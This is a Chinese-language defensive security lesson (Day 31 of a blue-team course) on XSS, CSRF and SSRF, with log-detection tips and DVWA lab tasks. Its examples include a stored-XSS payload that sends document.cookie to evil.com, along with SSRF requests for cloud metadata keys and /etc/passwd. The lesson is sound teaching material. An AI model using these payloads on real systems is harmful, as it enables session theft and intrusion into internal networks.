---
day: 31
title: XSS、CSRF、SSRF漏洞原理
phase: 第一阶段
difficulty: ⭐⭐⭐ 中等
---

# Day 31：XSS、CSRF、SSRF漏洞原理

> **阶段**：第一阶段 · 初级蓝队夯实 | **难度**：⭐⭐⭐ 中等 | **课时**：2-3小时

## 📋 今日学习目标
1. 掌握XSS三种类型（反射型/存储型/DOM型）
2. 理解CSRF攻击原理：冒充你操作
3. 了解SSRF攻击：利用服务器偷内网数据
4. 学会从日志中检测这三种攻击

## 📖 核心知识讲解
### 一、XSS跨站脚本攻击

**反射型XSS（一次性）**：恶意脚本通过URL参数反射到页面执行。
```
GET /search?q=<script>alert(1)</script>
```

**存储型XSS（持久化）**：恶意脚本存储在服务器（留言板/评论区），所有访问者都会被攻击。
```
POST /comment  body: msg=<script>new Image().src='http://evil.com/steal?cookie='+document.cookie</script>
```

**DOM型XSS（客户端）**：纯前端js操作DOM导致的XSS，不经过服务器。

### 二、CSRF跨站请求伪造

攻击者在你不知情的情况下，用你的身份发送恶意请求。

**场景**：你登录了银行网站→收到钓鱼邮件→点击链接→实际执行了转账操作。因为浏览器带着你的Cookie，银行以为是你在操作。

**蓝队检测**：CSRF在日志中看起来完全正常。防护依赖CSRF Token、Referer校验、SameSite Cookie。

### 三、SSRF服务端请求伪造

让服务器帮你去访问它能看到但你（外部攻击者）看不到的内网资源。

**攻击示例：**
```
GET /fetch?url=http://192.168.1.100/admin     → 访问内网管理页面
GET /fetch?url=http://169.254.169.254/metadata → 读取云服务器元数据（获取AK/SK）
GET /fetch?url=file:///etc/passwd              → 读取服务器本地文件
```

**蓝队检测SSRF：**
- 日志中出现169.254.169.254（云Metadata地址）
- URL参数中包含内网IP（192.168/10.x/172.16-31）
- URL参数使用file://、gopher://、dict://等危险协议

## 🔧 实操任务
1. 在DVWA中完成XSS(Reflected/Stored/DOM)和CSRF关卡
2. 用Wireshark抓取XSS攻击流量
3. 练习从日志中识别SSRF攻击的特征

## ✅ 验收标准
- [ ] 能区分反射型/存储型/DOM型XSS
- [ ] 能用自己的话解释CSRF攻击原理
- [ ] 理解SSRF为什么危险（访问内网/读取文件/云Metadata）

## 📝 今日小结
今天学习了XSS、CSRF、SSRF漏洞原理的核心内容。蓝队成长的关键在于持续积累，把每个知识点内化为自己的实战能力。记住：理论+实操+复盘=真正的成长。

## 📚 延伸阅读
- 将今天所学整理到个人笔记库
- 搜索相关关键词了解更多行业案例
